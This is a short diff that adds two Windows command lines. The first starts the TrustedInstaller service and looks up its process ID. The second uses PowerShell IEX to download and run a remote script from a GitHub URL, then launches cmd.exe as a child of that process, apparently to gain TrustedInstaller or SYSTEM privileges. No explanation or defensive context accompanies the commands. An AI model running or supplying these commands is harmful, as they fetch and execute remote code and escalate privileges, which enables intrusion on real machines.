@@ -1,0 +1,2 @@
+net start trustedinstaller & sc queryex trustedinstaller | find /i "pid"
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent(<PID_Value_From_Previous_Command>,'c:\windows\system32\cmd.exe')"
